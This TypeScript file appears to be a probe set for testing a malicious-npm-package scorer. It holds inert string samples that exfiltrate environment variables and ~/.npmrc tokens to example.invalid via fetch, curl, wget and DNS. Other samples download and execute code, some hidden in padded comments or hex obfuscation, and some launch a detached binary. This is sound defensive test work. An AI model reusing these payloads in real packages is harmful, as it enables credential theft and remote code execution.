// The third review of apm-score-v10 (HOLD, safety 4/10): every probe the reviewer scored, and the cases this round
// adds for each finding. Every package is an inert string: hosts are example.invalid, tokens are fake, nothing here runs.
// `expect` says what the scorer owes each case:
// - `refuse`: under the floor with the code run at install (postinstall), and at least as low as v9 scored it;
// - `pass`: benign; at least the floor, and 75 or more where `strong` is set;
// - `gap`: a known miss listed in docs/SCORE.md ("What the score does not catch"); reported, not asserted.

export type ProbeExpect = "refuse" | "pass" | "gap";

export type Probe = { id: string; expect: ProbeExpect; strong?: boolean; finding?: number; files: Readonly<Record<string, string>> };

const URL = "'https://example.invalid/c'";
const send = (x: string): string => `fetch(${URL},{method:'POST',body:JSON.stringify(${x})});`;
const down = (x: string): string => `fetch(${URL}).then(r=>r.text()).then(code=>{${x}});`;
const NPMRC = "require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8')";

/** The reviewer's shared re-export DAG: `n` levels of two files that each re-export both files of the next level. */
export function dagFiles(n: number) {
  const files = new Map([["index.js", `const e=require('./a0');${send("e")}`]]);

  for (let i = 0; i < n; i++) for (const k of ["a", "b"]) files.set(`${k}${i}.js`, i === n - 1 ? "module.exports=process.env;" : `module.exports=[require('./a${i + 1}'),require('./b${i + 1}')];`);

  return Object.fromEntries(files);
}

/** A function whose comment holds a payload after `pad` spaces, read back with String(f) and run in a Worker. */
export function paddedComment(pad: number): string {
  return `function f(){/*${" ".repeat(pad)}${send("process.env")}*/}new(require('worker_threads').Worker)(String(f).split('/*')[1].split('*/')[0],{eval:true});`;
}

const one = (id: string, expect: ProbeExpect, src: string, extra: Record<string, string> = {}, more: Partial<Probe> = {}): Probe => ({ id, expect, files: { "index.js": src, ...extra }, ...more });

const hex = (s: string): string => Buffer.from(s).toString("hex");

export const PROBES: readonly Probe[] = [
  // ---- the reviewer's first probe set (apm-recheck-probes.mjs) ----
  one("object-literal-env", "refuse", `const o={value:process.env};${send("o.value")}`),
  one("object-write-env", "refuse", `const o={};o.value=process.env;${send("o.value")}`),
  one("array-literal-env", "refuse", `const a=[process.env];${send("a[0]")}`),
  one("array-push-env", "refuse", `const a=[];a.push(process.env);${send("a[0]")}`, {}, { finding: 6 }),
  one("closure-env", "refuse", `function get(){return process.env}${send("get()")}`),
  one("class-field-env", "refuse", `class C{value=process.env}const c=new C;${send("c.value")}`),
  one("class-this-env", "refuse", `class C{constructor(){this.value=process.env}}${send("(new C).value")}`),
  one("json-env", "refuse", send("JSON.parse(JSON.stringify(process.env))")),
  one("buffer-env", "refuse", send("Buffer.from(JSON.stringify(process.env)).toString('base64')")),
  one("promise-env", "refuse", `Promise.resolve(process.env).then(e=>{${send("e")}});`),
  one("async-iter-env", "refuse", `async function* values(){yield process.env}(async()=>{for await(const e of values()){${send("e")}}})();`, {}, { finding: 7 }),
  one("emitter-env", "refuse", `const e=new (require('events').EventEmitter)();e.on('data',x=>{${send("x")}});e.emit('data',process.env);`, {}, { finding: 7 }),
  one("reflect-send", "refuse", `Reflect.apply(fetch,null,[${URL},{method:'POST',body:JSON.stringify(process.env)}]);`),
  one("call-send", "refuse", `fetch.call(null,${URL},{method:'POST',body:JSON.stringify(process.env)});`),
  one("apply-eval", "refuse", down("Reflect.apply(eval,null,[code]);")),
  one("call-eval", "refuse", down("eval.call(null,code);")),
  one("computed-require", "refuse", down("require(['child','process'].join('_')).exec(code);")),
  one("dynamic-import", "refuse", `(async()=>{const {exec}=await import('node:child_process');const code=await (await fetch(${URL})).text();exec(code)})();`),
  one("worker-download", "refuse", down("new (require('worker_threads').Worker)(code,{eval:true});")),
  one("vm-download", "refuse", down("require('vm').runInNewContext(code);")),
  one("fork-written-download", "refuse", down("require('fs').writeFileSync('/tmp/apm-fake.cjs',code);require('child_process').fork('/tmp/apm-fake.cjs');"), {}, { finding: 3 }),
  one("require-written-download", "refuse", down("require('fs').writeFileSync('/tmp/apm-fake.cjs',code);require('/tmp/apm-fake.cjs');"), {}, { finding: 3 }),
  one("binding-env", "gap", `const env=process.binding('credentials').env;${send("env")}`),
  one("dns-env", "refuse", `const d=Buffer.from(JSON.stringify(process.env)).toString('hex');require('dns').resolve(d+'.example.invalid',()=>{});`),
  one("curl-env", "refuse", `require('child_process').execFile('curl',['-X','POST','--data',JSON.stringify(process.env),${URL}]);`, {}, { finding: 5 }),
  one("curl-cred", "refuse", `const t=${NPMRC};require('child_process').execFile('curl',['-X','POST','--data',t,${URL}]);`, {}, { finding: 5 }),
  one("three-file-env", "refuse", `const x=require('./b');${send("x")}`, { "b.js": "module.exports=require('./c');", "c.js": "module.exports=process.env;" }),
  one("three-file-cred", "refuse", `const x=require('./b');${send("x")}`, { "b.js": "module.exports=require('./c');", "c.js": `module.exports=${NPMRC};` }),
  ...["cjs", "mjs", "ts", "txt"].map((ext) => one(`extension-${ext}`, "refuse", `require('./payload.${ext}');`, { [`payload.${ext}`]: send("process.env") })),
  one("fp-object-selected", "pass", `const o={safe:'public',all:process.env};${send("o.safe")}`, {}, { strong: true }),
  one("fp-promise-selected", "pass", `Promise.resolve({safe:'public',all:process.env}).then(x=>{${send("x.safe")}});`, {}, { strong: true }),
  one("fp-array-selected", "pass", `const a=['public',process.env];${send("a[0]")}`, {}, { strong: true }),
  one("fp-closure-context", "pass", `function id(x){return x}const keep=id(process.env);${send("id('public')")}`, {}, { strong: true, finding: 8 }),
  one("fp-read-credential-npm", "pass", `const fs=require('fs');module.exports=()=>fs.readFileSync(require('os').homedir()+'/.npmrc','utf8');`),
  one("telemetry-selected-env", "pass", send("{platform:process.env.NODE_ENV,ci:process.env.CI}"), {}, { strong: true }),
  one("npm-token-upload", "gap", send("process.env.NPM_TOKEN")),
  one("shell-injection", "refuse", down("require('child_process').exec('echo '+code);"), {}, { finding: 4 }),
  ...[8, 16, 32, 40, 80].map((n) => {
    let c = "const v0=process.env;";

    for (let i = 1; i <= n; i++) c += `const v${i}=v${i - 1};`;

    return one(`alias-depth-${n}`, "refuse", c + send(`v${n}`));
  }),

  // ---- the reviewer's second set (apm-recheck-more.mjs) ----
  one("big-recovered-comment", "refuse", paddedComment(270_000), {}, { finding: 2 }),
  one("small-recovered-comment", "refuse", paddedComment(100)),
  one("binding-download", "refuse", `fetch(${URL}).then(r=>r.text()).then(c=>process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c',c],envPairs:[],stdio:[]}));`),
  one("wasm-env", "gap", `const a=[];new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])),{env:{run:()=>a.push(process.env)}}).exports.run();${send("a[0]")}`),
  one("fp-credential-helper", "pass", `function id(x){return x}const secret=id(${NPMRC});${send("id('public')")}`, {}, { finding: 8 }),
  one("read-file-callback", "refuse", `require('fs').readFile(require('os').homedir()+'/.npmrc','utf8',(e,t)=>{${send("t")}});`, {}, { finding: 7 }),
  one("read-file-promise", "refuse", `require('fs/promises').readFile(require('os').homedir()+'/.npmrc','utf8').then(t=>{${send("t")}});`),
  // 62: no confirmed flow (one family is sent); the text rule still sees three families beside a network call (-35)
  one("npm-auth-three-families", "pass", `const tokens={npm:process.env.NPM_TOKEN,github:process.env.GITHUB_TOKEN,aws:process.env.AWS_SECRET_ACCESS_KEY};fetch(${URL},{headers:{Authorization:'Bearer '+tokens.npm}});`, {}, { finding: 9 }),
  one("dag-45", "refuse", "", dagFiles(22), { finding: 1 }),

  // ---- finding 10: example code a package exports as text ----
  // 62: no confirmed flow; the text rule still sees an env dump beside fetch( in the same file (-35)
  one("fp-exported-example", "pass", `module.exports="fetch('https://example.invalid/c',{method:'POST',body:JSON.stringify(process.env)})";`, {}, { finding: 10 }),
  one("fp-exported-example-object", "pass", `exports.snippet=\`const t=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');fetch('https://example.invalid/c',{method:'POST',body:t});\`;`, {}, { strong: true, finding: 10 }),
  one("written-example-then-run", "refuse", `require('fs').writeFileSync('/tmp/apm-held.js',"fetch('https://example.invalid/c',{method:'POST',body:JSON.stringify(process.env)})");require('/tmp/apm-held.js');`, {}, { finding: 10 }),

  // ---- finding 8 and 9: more benign shapes ----
  one("fp-helper-two-calls", "pass", `function wrap(x){return {data:x}}const a=wrap(process.env);console.log(Object.keys(a.data).length);${send("wrap('hello')")}`, {}, { strong: true, finding: 8 }),
  one("fp-nested-config", "pass", `const cfg={auth:{npm:process.env.NPM_TOKEN},gh:process.env.GITHUB_TOKEN,aws:process.env.AWS_ACCESS_KEY_ID};fetch(${URL},{headers:{authorization:cfg.auth.npm}});`, {}, { finding: 9 }),
  one("three-families-sent", "refuse", `const tokens={npm:process.env.NPM_TOKEN,github:process.env.GITHUB_TOKEN,aws:process.env.AWS_SECRET_ACCESS_KEY};${send("tokens")}`, {}, { finding: 9 }),
  one("helper-sends-env", "refuse", `function id(x){return x}${send("id(process.env)")}`, {}, { finding: 8 }),

  // ---- finding 3: written, then run ----
  one("spawn-node-written", "refuse", down("const p=require('path').join(require('os').tmpdir(),'x.js');require('fs').writeFileSync(p,code);require('child_process').spawn(process.execPath,[p]);"), {}, { finding: 3 }),
  one("import-written", "refuse", down("require('fs').writeFileSync('./x.mjs',code);import('./x.mjs');"), {}, { finding: 3 }),
  one("promises-write-require", "refuse", `fetch(${URL}).then(r=>r.text()).then(code=>require('fs').promises.writeFile('/tmp/x.js',code)).then(()=>require('/tmp/x.js'));`, {}, { finding: 3 }),
  one("stream-pipe-require", "refuse", `require('https').get('https://example.invalid/p',res=>{const w=require('fs').createWriteStream('/tmp/x.js');res.pipe(w);w.on('finish',()=>require('/tmp/x.js'))});`, {}, { finding: 3 }),
  one("stream-write-fork", "refuse", down("const w=require('fs').createWriteStream('/tmp/x.js');w.write(code);w.end();require('child_process').fork('/tmp/x.js');"), {}, { finding: 3 }),
  one("binary-chmod-exec", "refuse", `const fs=require('fs');const {exec}=require('child_process');(async()=>{const r=await fetch(${URL});fs.writeFileSync('agent',Buffer.from(await r.arrayBuffer()));exec('chmod +x agent');exec('setsid nohup ./agent -s host >/dev/null 2>&1 &')})();`, {}, { finding: 3 }),

  // ---- finding 4: downloaded data spliced into a command ----
  one("shell-template", "refuse", down("require('child_process').execSync(`echo ${code} > /dev/null`);"), {}, { finding: 4 }),
  one("shell-spawn-shell-true", "refuse", down("require('child_process').spawn('echo '+code,{shell:true});"), {}, { finding: 4 }),

  // ---- finding 5: sent in curl's or wget's arguments ----
  one("wget-env", "refuse", `require('child_process').spawn('wget',['--post-data='+JSON.stringify(process.env),${URL}]);`, {}, { finding: 5 }),
  one("curl-exec-string", "refuse", `require('child_process').exec("curl -d '"+JSON.stringify(process.env)+"' https://example.invalid/c");`, {}, { finding: 5 }),
  one("curl-sh-c", "refuse", `const t=${NPMRC};require('child_process').spawn('sh',['-c','curl --data-binary '+JSON.stringify(t)+' https://example.invalid/c']);`, {}, { finding: 5 }),

  // ---- finding 6: containers and aliases ----
  one("array-alias-push", "refuse", `const a=[];const b=a;b.push(process.env);${send("a[0]")}`, {}, { finding: 6 }),
  one("array-index-write", "refuse", `const a=[];a[0]=process.env;${send("a")}`, {}, { finding: 6 }),
  one("map-set-get", "refuse", `const m=new Map();m.set('k',process.env);${send("m.get('k')")}`, {}, { finding: 6 }),
  one("array-unshift", "refuse", `const a=['x'];a.unshift(process.env);${send("a")}`, {}, { finding: 6 }),
  one("object-assign-target", "refuse", `const o={};Object.assign(o,{all:process.env});${send("o")}`, {}, { finding: 6 }),
  one("array-splice", "refuse", `const a=[];a.splice(0,0,process.env);${send("a[0]")}`, {}, { finding: 6 }),

  // ---- finding 7: callbacks and generators ----
  one("generator-env", "refuse", `function* g(){yield process.env}for(const e of g()){${send("e")}}`, {}, { finding: 7 }),
  one("emitter-once-alias", "refuse", `const {EventEmitter}=require('events');const e=new EventEmitter();const f=e;f.once('x',v=>{${send("v")}});e.emit('x',process.env);`, {}, { finding: 7 }),
  one("read-file-callback-cred-send", "refuse", `const fs=require('fs');fs.readFile(require('path').join(require('os').homedir(),'.npmrc'),(err,buf)=>{if(!err)${send("buf.toString()")}});`, {}, { finding: 7 }),

  // ---- the two held-out misses, reduced to their shape ----
  one(
    "hex-table-env-post-eval",
    "refuse",
    `"use strict";function g(h){return h.replace(/../g,m=>String.fromCharCode(parseInt(m,16)))}let hl=[g('${hex("require")}'),g('${hex("axios")}'),g('${hex("post")}'),g('${hex("https://example.invalid/c")}'),g('${hex("then")}')];const writer=()=>require(hl[1])[[hl[2]]](hl[3],{...process.env})[[hl[4]]](r=>eval(r.data));module.exports=writer;`,
  ),
  one(
    "stream-download-chmod-exec",
    "refuse",
    `const fs=require('fs');const axios=require('axios');const {exec}=require('child_process');async function dl(){const r=await axios({method:'get',url:'https://example.invalid/bin',responseType:'stream'});const w=fs.createWriteStream('npm');r.data.pipe(w);return new Promise(res=>{w.on('finish',()=>{exec('chmod +x npm',()=>res())})})}(async()=>{await dl();exec('setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &',{shell:'/bin/bash'})})();`,
  ),
];

/** Benign shapes the popular corpus does not cover: CLI `.npmrc` readers, an SDK with many credentials, a code generator. */
export const BENIGN_EXTRA: readonly Probe[] = [
  one(
    "npm-cli-npmrc",
    "pass",
    `const fs=require('fs'),path=require('path'),os=require('os');function readRc(){const file=path.join(os.homedir(),'.npmrc');let text='';try{text=fs.readFileSync(file,'utf8')}catch{}const cfg={};for(const line of text.split('\\n')){const m=/^([^=]+)=(.*)$/.exec(line.trim());if(m)cfg[m[1]]=m[2]}return cfg}module.exports=async function publish(pkg){const cfg=readRc();const token=cfg['//registry.npmjs.org/:_authToken'];return fetch('https://registry.npmjs.org/'+pkg.name,{method:'PUT',headers:{authorization:'Bearer '+token},body:JSON.stringify(pkg)})};`,
  ),
  one(
    "pnpm-cli-npmrc",
    "pass",
    `import {readFileSync} from 'node:fs';import {homedir} from 'node:os';import {join} from 'node:path';export function loadNpmrc(){const raw=readFileSync(join(homedir(),'.npmrc'),'utf8');return Object.fromEntries(raw.split(/\\r?\\n/).filter(Boolean).map(l=>l.split('=')))}export async function whoami(registry){const rc=loadNpmrc();const auth=rc[registry.replace(/^https?:/,'')+':_authToken'];const res=await fetch(new URL('-/whoami',registry),{headers:{authorization:\`Bearer \${auth}\`}});return (await res.json()).username}`,
  ),
  one(
    "yarn-cli-npmrc",
    "pass",
    `const fs=require('fs');const os=require('os');const path=require('path');const https=require('https');class Config{constructor(){this.rc={};for(const f of [path.join(os.homedir(),'.npmrc'),path.join(process.cwd(),'.npmrc'),path.join(os.homedir(),'.yarnrc')]){if(fs.existsSync(f))Object.assign(this.rc,this.parse(fs.readFileSync(f,'utf8')))}}parse(t){const o={};t.split('\\n').forEach(l=>{const i=l.indexOf('=');if(i>0)o[l.slice(0,i).trim()]=l.slice(i+1).trim()});return o}token(){return this.rc['//registry.yarnpkg.com/:_authToken']||process.env.YARN_NPM_AUTH_TOKEN}}module.exports=function info(name){const c=new Config();return new Promise(r=>https.get({host:'registry.yarnpkg.com',path:'/'+name,headers:{authorization:'Bearer '+c.token()}},res=>{let b='';res.on('data',d=>b+=d);res.on('end',()=>r(JSON.parse(b)))}))};`,
  ),
  one(
    "multi-credential-sdk",
    "pass",
    `const cfg={npmToken:process.env.NPM_TOKEN,githubToken:process.env.GITHUB_TOKEN,awsKey:process.env.AWS_ACCESS_KEY_ID,awsSecret:process.env.AWS_SECRET_ACCESS_KEY,slack:process.env.SLACK_TOKEN};class Client{constructor(o=cfg){this.o=o}github(p){return fetch('https://api.github.com'+p,{headers:{authorization:'token '+this.o.githubToken}})}npm(p){return fetch('https://registry.npmjs.org'+p,{headers:{authorization:'Bearer '+this.o.npmToken}})}}module.exports={Client,cfg};`,
  ),
  one(
    "codegen-examples",
    "pass",
    `const examples={fetchEnv:"const res = await fetch(url, { method: 'POST', body: JSON.stringify(process.env) });",readRc:"const rc = require('fs').readFileSync(require('os').homedir() + '/.npmrc', 'utf8');",run:"require('child_process').exec(command)"};function render(name){return '// generated\\n'+examples[name]+'\\n'}module.exports={examples,render};`,
  ),
];
